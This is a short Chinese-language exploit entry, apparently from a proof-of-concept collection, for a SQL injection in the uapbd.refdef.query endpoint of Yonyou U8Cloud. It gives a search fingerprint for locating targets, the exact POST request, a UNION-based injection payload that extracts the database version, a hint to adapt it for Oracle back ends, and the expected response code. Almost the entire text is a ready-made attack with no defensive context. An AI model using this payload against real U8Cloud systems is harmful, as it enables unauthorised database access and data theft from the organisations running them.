# 用友U8Clouduapbd.refdef.querySQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`title=="U8C"`
- **请求**：`POST /u8cloud/openapi/uapbd.refdef.query?appcode=huo&isEncrypt=N HTTP/1.1`

**Payload**
```
{"refName":"1%' UNION ALL SELECT 1,CONVERT(INT,@@VERSION),1-- "}
部分数据库为Oracle，自行构造payload
```
- **响应特征**：200